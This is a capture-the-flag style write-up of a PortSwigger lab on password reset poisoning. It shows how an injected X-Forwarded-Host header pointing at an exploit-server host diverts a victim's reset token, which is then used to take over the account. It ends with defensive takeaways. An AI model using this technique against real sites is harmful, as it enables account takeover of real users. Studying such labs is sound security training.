# PortSwigger Lab – Password Reset Poisoning via Middleware

## Lab Details
Category: Server-Side Authentication – Other Mechanisms  
Level: Practitioner  
Status: Solved   

---

## Lab Description
This lab is vulnerable to **password reset poisoning** caused by improper handling of host headers by backend middleware.  
The application trusts the `X-Forwarded-Host` header when generating password reset links, allowing an attacker to redirect the victim to a malicious domain and steal their reset token.

The victim user (Carlos) will click any password reset link he receives.

---

## Objective
- Poison the password reset link
- Steal Carlos’s reset token
- Reset Carlos’s password
- Log in to Carlos’s account

---

## Credentials
- Attacker account: `wiener : peter`
- Victim username: `carlos`

---

## Tools Used
- Burp Suite (Proxy, Repeater)
- Exploit Server
- Email Client

---

## Solution Walkthrough

### Step 1: Analyze Password Reset Flow
Triggered the **Forgot password** functionality and observed that a reset email containing a unique tokenized link is sent to the user.

This confirms the application relies on email-based password reset tokens.

---

### Step 2: Identify Host Header Trust
Sent the `POST /forgot-password` request to **Burp Repeater**.

Observed that the application accepts the `X-Forwarded-Host` header and uses it when generating the password reset link.

This means the backend middleware trusts user-controlled headers.

---

### Step 3: Prepare the Exploit Server
Opened the exploit server and noted the server URL:
```

YOUR-EXPLOIT-SERVER-ID.exploit-server.net

```

---

### Step 4: Poison the Reset Request
Modified the password reset request in Burp Repeater:

Added the following header:
```

X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net

```

Changed the username parameter to:
```

carlos

```

Sent the request.

This caused the reset link emailed to Carlos to point to the exploit server instead of the legitimate application.

---

### Step 5: Steal the Reset Token
Opened the exploit server **Access Log**.

Observed a request similar to:
```

GET /forgot-password?temp-forgot-password-token=XXXX

```

Copied the value of the stolen reset token.

---

### Step 6: Reset Carlos’s Password
Opened my own email client and copied a **valid password reset link** (the legitimate one).

Pasted it into the browser and replaced the value of:
```

temp-forgot-password-token

```
with the stolen token.

Loaded the page and set a new password for Carlos’s account.

---

### Step 7: Account Takeover
Logged in using Carlos’s username and the newly set password.

Successfully accessed Carlos’s account page, solving the lab.

---

## Impact
- Password reset poisoning
- Account takeover without credentials
- Abuse of trusted proxy headers
- Full authentication bypass

---

## Key Takeaways
- Password reset links must not trust user-controlled headers
- Middleware can silently introduce critical vulnerabilities
- `X-Forwarded-Host` should be strictly validated or ignored
- Email-based workflows are high-value attack targets
